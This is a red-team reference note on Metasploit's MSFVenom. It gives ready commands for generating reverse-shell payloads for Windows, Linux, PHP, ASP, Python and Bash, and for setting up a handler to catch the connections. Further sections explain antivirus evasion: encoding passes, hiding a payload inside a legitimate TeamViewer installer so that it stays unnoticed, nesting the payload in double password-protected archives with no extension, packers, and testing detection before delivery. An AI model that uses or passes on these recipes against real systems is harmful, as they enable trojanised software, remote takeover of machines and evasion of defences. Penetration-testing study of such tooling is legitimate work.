Tags: #Status/In-Progress #Type/Tool #Context/Linux #Context/Redteam

---
## Overview
MSFVenom is the standalone Metasploit payload generator and encoder. It combines the functionality of the older `msfpayload` and `msfencode` tools into a single command. MSFVenom generates shellcode, executables, scripts, and other payload formats for delivery outside of MSFConsole — used when you need to drop a file on the target, upload a web shell, or deliver a payload through a non-Metasploit vector. After deploying the payload, a handler must be set up in MSFConsole to catch the incoming connection.

## Target / Context
Used when a payload needs to be generated as a file or raw shellcode for external delivery. Pairs with `exploit/multi/handler` in [[MSFConsole]] to catch the reverse connection. Part of the [[Metasploit]] framework.

---
## Installation

> [!INFO]- Installation Commands:
> MSFVenom is installed as part of Metasploit Framework:
> `sudo apt install metasploit-framework`
> Verify: `msfvenom --version`

---
## Basic Usage

> [!INFO]- Basic Usage:
> `msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> > output_file`
>
> List available payloads: `msfvenom -l payloads`
> List available formats: `msfvenom --list formats`
> Filter payloads by keyword: `msfvenom --list payloads | grep meterpreter`
> List available encoders: `msfvenom --list encoders`

---
## Flags & Options

> [!INFO]- Flags & Options:
> | Flag | Description | Example |
> |------|-------------|---------|
> | `-p` | Payload to use | `-p windows/x64/meterpreter/reverse_tcp` |
> | `LHOST` | Attacker IP address | `LHOST=10.10.10.5` |
> | `LPORT` | Attacker listening port | `LPORT=4444` |
> | `-f` | Output format | `-f exe` / `-f elf` / `-f raw` / `-f php` |
> | `-e` | Encoder to apply | `-e x86/shikata_ga_nai` |
> | `-i` | Number of encoding iterations | `-i 5` |
> | `-o` | Output file (alternative to `>` redirect) | `-o rev_shell.exe` |
> | `-b` | Bad characters to avoid in shellcode | `-b "\x00\x0a\x0d"` |
> | `-x` | Executable template to inject the payload into | `-x ~/Downloads/TeamViewer_Setup.exe` |
> | `-k` | Keep original application running alongside the payload | `-k` |
> | `-a` | Architecture override | `-a x86` |
> | `--platform` | Platform override | `--platform windows` |
> | `--list` | List available options (payloads, formats, encoders) | `--list payloads` |

---
## Common Use Cases

### Generating Platform-Specific Payloads

> [!INFO]- Linux ELF:
> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > rev_shell.elf`

> [!INFO]- Windows EXE:
> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > rev_shell.exe`
>
> 64-bit Windows:
> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > rev_shell.exe`

> [!INFO]- Web Shells:
> PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.php`
> ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f asp > rev_shell.asp`
>
> PHP note: Remove PHP comments from the output and ensure the file ends with `?>` before deploying.

> [!INFO]- Script Payloads:
> Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.py`
> Bash: `msfvenom -p cmd/unix/reverse_bash LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.sh`

---

### Encoding Payloads
Encoders transform the payload to evade signature-based detection. Multiple encoding passes increase obfuscation but also increase payload size.

> [!INFO]- Commands:
> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe`
>
> PHP with base64 encoding:
> `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.5 -f raw -e php/base64`
>
> Common encoders:
> `x86/shikata_ga_nai` — polymorphic XOR additive feedback encoder (most common)
> `x64/xor` — 64-bit XOR encoder
> `php/base64` — base64 encoding for PHP payloads

---

### Setting Up a Handler
After deploying a payload, launch a handler in MSFConsole to catch the incoming reverse connection.

> [!INFO]- Commands:
> `msfconsole`
> `use exploit/multi/handler`
> `set PAYLOAD <same payload used in msfvenom>`
> `set LHOST <your IP>`
> `set LPORT <your port>`
> `exploit`
>
> Example for a PHP reverse shell:
> `set PAYLOAD php/meterpreter/reverse_tcp`
> `set LHOST 10.0.2.19`
> `set LPORT 7777`
> `exploit`
>
> The handler waits for the payload to connect back. Once the target executes the payload file, the session opens in MSFConsole.
> Run `exploit -z` to catch the session and immediately background it.

---

### Template Injection
Inject a payload into a legitimate executable so the malicious code is hidden inside real application code. Use `-k` to keep the original application running normally — this avoids raising suspicion if the target launches the file from a GUI.

> [!INFO]- Commands:
> `msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5`
>
> `-x` specifies the legitimate executable to use as a template.
> `-k` causes the payload to spawn in a separate thread so the real application continues running.
> `-i 5` applies 5 encoding passes — increases obfuscation but also file size.
>
> Note: Even with encoding and templates, modern AV solutions detect most MSFVenom payloads. Template injection is more effective against older or signature-only AV. Test payloads with `msf-virustotal` before deployment.

---

### Archive Evasion
Placing a payload inside a password-protected archive bypasses many AV scanners that cannot inspect encrypted archives. Removing the file extension makes it less obvious. Double-archiving with separate passwords adds another layer.

> [!INFO]- Commands:
> Install RAR utility:
> `wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz`
> `tar -xzvf rarlinux-x64-612.tar.gz && cd rar`
>
> Generate payload:
> `msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`
>
> Archive with password (first layer):
> `rar a ~/test.rar -p ~/test.js`
> `mv test.rar test`
>
> Archive again (second layer):
> `rar a test2.rar -p test`
> `mv test2.rar test2`
>
> Delivering a double-archived, password-protected payload with no extension significantly reduces automatic scanning coverage.

---

### Packers
Packers compress and wrap an executable so the payload is unpacked in memory at runtime, making static signature matching harder. The decompression stub is the only part visible on disk.

Common packers: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida.

Note: Packers are effective against signature-based detection but may trigger heuristic detection due to the compression stub pattern. UPX in particular has well-known signatures in most AV databases.

---

### Testing Payloads with msf-virustotal
`msf-virustotal` is a Metasploit utility that submits a payload file to VirusTotal for detection testing against multiple AV engines. Requires a free VirusTotal API key.

> [!INFO]- Commands:
> `msf-virustotal -k <API-KEY> -f <payload-file>`
>
> Use this to gauge how detectable a generated payload is before delivery. Highly detected payloads need additional obfuscation — more encoding passes, template injection, or manual payload modification.
>
> Warning: Submitting to VirusTotal makes the payload public. Never submit payloads containing client-specific IPs or identifying information during a real engagement.

---
## Related Techniques
-

## Related Playbooks
- [[Red Team]]

---
## References / Images
- Working with Payloads: https://docs.rapid7.com/metasploit/working-with-payloads/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
- The Metasploit Book: https://nostarch.com/metasploit
